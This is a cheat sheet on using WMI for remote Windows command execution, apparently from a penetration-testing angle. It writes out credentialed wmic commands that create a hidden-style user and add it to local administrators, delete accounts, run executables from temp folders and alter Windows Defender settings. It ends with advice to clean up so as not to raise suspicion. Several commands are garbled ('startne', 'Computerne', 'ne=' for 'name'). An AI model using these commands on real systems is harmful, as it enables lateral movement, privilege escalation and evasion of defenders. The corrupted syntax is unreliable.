### What it does:
- WMI is a remote information and management protocol for Windows, allowing the execution of commands and retrieval of information across the network.

### Ports:
- **TCP 135 (RPC Portmapper)**
- **Random High Number Ports (DCOM)**

### Authentication:
- Only specified authorized users are allowed to access and execute WMI commands.

### Tools:
- `wmic.exe`, `wmiexplorer`, `wmic`, PowerShell, native .NET calls

### Signatures:
- Enable WMI tracing in the Event Viewer to monitor WMI-Activity.
- Look for Event ID 5861 and related logs under the **WMI-Activity** log group.

### Commands and Examples:

#### Retrieve Service Information
- **Command**: Retrieve details about services running on a remote machine.
```bash
wmic.exe /USER:"testlab\josh" /PASSWORD:"Password1" /NODE:192.168.112.200 service get "startne,pathne"
```
- **PowerShell Example**:
```powershell
Get-WMIObject -Computerne 192.168.112.200 -query "Select * from Win32_Service"
```

#### Copy/Transfer Files
- **Command**: Copy a file from one location to another on a remote machine.
```bash
wmic /node:RemotePC process call create "xcopy /Y C:\Path\To\example.txt C:\"
```

#### Create a User and Add to Local Admin Group
- **Command**: Create a user and add them to the local administrators group.
```bash
wmic /node:"IN-BLRDWV.test-globalx.com" /user:"test-globalx.com\IN_aurasqluser001" /password:"Welc<Redacted>00" process call create "cmd.exe /c net user nispentest <Redacted> && net localgroup administrators nispentest /add"
```

#### Delete a User
- **Command**: Delete a user account from a remote machine.
```bash
wmic /node:"SG-BAK001.test-globalx.com" /user:"test-globalx\SG-SA-BkExec-P01" /password:"<redacted>" process call create "cmd.exe /c net user support$ /delete"
```

#### List Admin Users and Save to a File
- **Command**: List all local administrators on a remote machine and save the output to a text file.
```bash
wmic /node:"SG-BAKV001.test-globalx.com" /user:"test-globalx\SG-SA-BkExec-P01" /password:"<redacted>" process call create "net localgroup Administrators > c:\test.txt"
```

#### Mount a Remote Share
- **Command**: Mount a remote network share using provided credentials.
```bash
net use * \\SG-BAKPWV001.test-globalx.com\c$ /u:test-globalx.com\SG-SA-BkExec-P01
```

#### Run Executable and Log Output to a File
- **Command**: Execute a program on a remote machine and pipe the output to a log file.
```bash
wmic /node:"s.psb.com" process call create "cmd.exe /c c:\windows\temp\cylsvc.exe >> c:\windows\temp\z2.txt"
```

#### Modify Windows Defender Settings (e.g., Remove Exclusion Path)
- **Command**: Execute PowerShell commands via WMI to modify system settings like Windows Defender exclusions.
```bash
wmic /node:"GZ-\1.test-globalx.com" process call create "cmd.exe /c powershell.exe Remove-MpPreference -ExclusionPath C:\Windows\temp >> c:\windows\temp\z.txt"
```

#### Uninstall a Program
- **Command**: Uninstall a specific program from a remote machine using WMI.
```bash
wmic product where ne="Power Automate for desktop" call uninstall
```

### Additional Notes:
- **Wmiexplorer**: This tool can filter out system WMI queries, allowing you to focus on specific queries of interest.
- **Best Practices**: Always clean up after performing WMI tasks to avoid leaving traces that might raise suspicion.
